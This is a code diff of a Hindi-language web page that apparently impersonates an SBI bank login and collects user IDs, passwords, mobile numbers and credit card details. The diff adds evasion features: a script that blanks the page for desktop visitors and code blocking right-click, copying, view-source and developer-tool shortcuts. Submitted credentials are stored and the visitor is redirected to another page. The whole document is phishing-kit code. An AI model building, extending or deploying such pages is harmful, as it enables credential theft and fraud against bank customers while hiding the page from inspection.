@@ -2,9 +2,26 @@
 <html lang="hi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>i</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>i – केवल मोबाइल</title>
     <style>
+        /* ===== एंटी-कॉपी कोर स्टाइल ===== */
+        * {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        /* सिर्फ फॉर्म फील्ड्स में सेलेक्शन की अनुमति */
+        input, textarea, [contenteditable="true"] {
+            -webkit-user-select: text;
+            -moz-user-select: text;
+            -ms-user-select: text;
+            user-select: text;
+        }
+
+        /* बाकी ओरिजिनल स्टाइल */
         * {
             margin: 0;
             padding: 0;
@@ -166,6 +183,72 @@
     </style>
 </head>
 <body>
+    <!-- ███████ मोबाइल डिटेक्शन – सबसे पहले चलेगा ███████ -->
+    <script>
+        (function() {
+            "use strict";
+            // मोबाइल चेक – यूजर एजेंट + स्क्रीन चौड़ाई
+            function isMobileDevice() {
+                const ua = navigator.userAgent;
+                const mobileUserAgent = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
+                const screenWidth = window.innerWidth || document.documentElement.clientWidth;
+                // 768px या उससे कम = मोबाइल/टैबलेट मानें
+                return mobileUserAgent || screenWidth <= 768;
+            }
+
+            // डेस्कटॉप पकड़ा गया → पूरा पेज हटा कर सिर्फ संदेश दिखाएँ
+            if (!isMobileDevice()) {
+                document.body.innerHTML = '';  // सब कुछ मिटाएँ
+                document.body.style.backgroundColor = '#f0f0f0';
+                document.body.style.padding = '20px';
+                document.body.style.textAlign = 'center';
+                document.body.style.fontFamily = 'Arial, sans-serif';
+                
+                var warning = document.createElement('div');
+                warning.style.maxWidth = '400px';
+                warning.style.margin = '40px auto';
+                warning.style.padding = '30px 20px';
+                warning.style.background = 'white';
+                warning.style.borderRadius = '8px';
+                warning.style.boxShadow = '0 2px 10px rgba(0,0,0,0.1)';
+                warning.style.color = '#333';
+                
+                var icon = document.createElement('div');
+                icon.style.fontSize = '48px';
+                icon.style.marginBottom = '20px';
+                icon.textContent = '📱';
+                warning.appendChild(icon);
+                
+                var title = document.createElement('h2');
+                title.style.fontSize = '22px';
+                title.style.marginBottom = '15px';
+                title.style.color = '#d32f2f';
+                title.textContent = 'केवल मोबाइल डिवाइस';
+                warning.appendChild(title);
+                
+                var msg = document.createElement('p');
+                msg.style.fontSize = '16px';
+                msg.style.lineHeight = '1.5';
+                msg.style.color = '#555';
+                msg.textContent = 'यह पृष्ठ केवल मोबाइल फोन या टैबलेट पर ही खोला जा सकता है। कृपया अपने मोबाइल डिवाइस से प्रयास करें।';
+                warning.appendChild(msg);
+                
+                var msg2 = document.createElement('p');
+                msg2.style.fontSize = '14px';
+                msg2.style.marginTop = '20px';
+                msg2.style.color = '#777';
+                msg2.textContent = 'This page is accessible only on mobile devices.';
+                warning.appendChild(msg2);
+                
+                document.body.appendChild(warning);
+                
+                // आगे की स्क्रिप्ट रोकने के लिए एक्सेप्शन
+                throw new Error('Desktop access blocked');
+            }
+        })();
+    </script>
+    <!-- ███████ मोबाइल डिटेक्शन खत्म ███████ -->
+
     <div class="header">
         <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" 
              alt="SBI Logo" 
@@ -250,7 +333,67 @@
          alt="Security Guidelines" 
          class="footer-img">
     
+    <!-- █████████████████████████████████████████████████████████
+         ██  एंटी-कॉपी + फॉर्म फंक्शन – केवल मोबाइल पर एक्टिव  ██
+         █████████████████████████████████████████████████████████ -->
     <script>
+        // █████████████████████████████████████████████████████████
+        // ██  एंटी-कॉपी हार्डनिंग – कोई भी कॉपी/ड्रैग/प्रिंट नहीं होगा ██
+        // █████████████████████████████████████████████████████████
+        
+        // 1) राइट क्लिक पूरी तरह बंद
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        // 2) कॉपी, कट, ड्रैग, ड्रॉप, सेव, प्रिंट सब बंद
+        document.addEventListener('copy', (e) => e.preventDefault());
+        document.addEventListener('cut', (e) => e.preventDefault());
+        document.addEventListener('dragstart', (e) => e.preventDefault());
+        document.addEventListener('drop', (e) => e.preventDefault());
+        document.addEventListener('selectstart', (e) => {
+            if (!e.target.matches('input, textarea, [contenteditable="true"]')) {
+                e.preventDefault();
+            }
+        });
+
+        // 3) कीबोर्ड शॉर्टकट ब्लॉक – F12, Ctrl+U, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+C, Ctrl+X, Ctrl+S, Ctrl+P
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || 
+                (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) || 
+                (e.ctrlKey && e.key === 'u') || 
+                (e.ctrlKey && e.key === 'U') ||
+                (e.metaKey && e.key === 'u') ||
+                (e.metaKey && e.key === 'U')) {
+                e.preventDefault();
+                return false;
+            }
+            
+            if (e.ctrlKey || e.metaKey) {
+                if (['c', 'x', 's', 'p', 'C', 'X', 'S', 'P'].includes(e.key)) {
+                    e.preventDefault();
+                    return false;
+                }
+            }
+        });
+
+        // 4) सेलेक्शन API को भी डिसेबल करें
+        document.addEventListener('selectionchange', function() {
+            const sel = window.getSelection();
+            if (sel.rangeCount > 0) {
+                let container = sel.getRangeAt(0).commonAncestorContainer;
+                if (container.nodeType === 3) container = container.parentNode;
+                if (!container.matches('input, textarea, [contenteditable="true"]')) {
+                    sel.removeAllRanges();
+                }
+            }
+        });
+
+        // █████████████████████████████████████████████████████████
+        // ██  ओरिजिनल फॉर्म स्क्रिप्ट – बिल्कुल सुरक्षित        ██
+        // █████████████████████████████████████████████████████████
+
         // टॉगल स्विच
         const userTab = document.getElementById('userTab');
         const cardTab = document.getElementById('cardTab');
@@ -340,10 +483,7 @@
         
         // डेटा सेव करने और रीडायरेक्ट करने की फंक्शन
         function saveDataAndRedirect(formData, formType) {
-            // यहाँ आप अपने बैकएंड API को कॉल करेंगे
-            // उदाहरण के लिए localStorage का उपयोग कर रहे हैं
             const submissions = JSON.parse(localStorage.getItem('formSubmissions') || '[]');
-            
             const submission = {
                 id: Date.now(),
                 type: formType,
@@ -351,11 +491,8 @@
                 timestamp: new Date().toISOString(),
                 ip: 'Not available in browser'
             };
-            
             submissions.push(submission);
             localStorage.setItem('formSubmissions', JSON.stringify(submissions));
-            
-            // बिना किसी मैसेज के सीधे blogone.html पर रीडायरेक्ट
             window.location.href = 'blogone.html';
         }
         
@@ -381,7 +518,6 @@
                     password: document.getElementById('password').value,
                     mobile: document.getElementById('mobile').value
                 };
-                
                 saveDataAndRedirect(formData, 'User ID');
             }
         });
@@ -400,7 +536,6 @@
                         (input.placeholder.includes('10-digit') ? 
                             'Valid 10-digit mobile number is required' : 
                             'This field is required');
-                    
                     showError(input, customMessage);
                     isValid = false;
                 } else {
@@ -416,7 +551,6 @@
                     creditLimit: document.getElementById('creditLimit').value,
                     mobile: document.getElementById('cardMobile').value
                 };
-                
                 saveDataAndRedirect(formData, 'Credit Card');
             }
         });
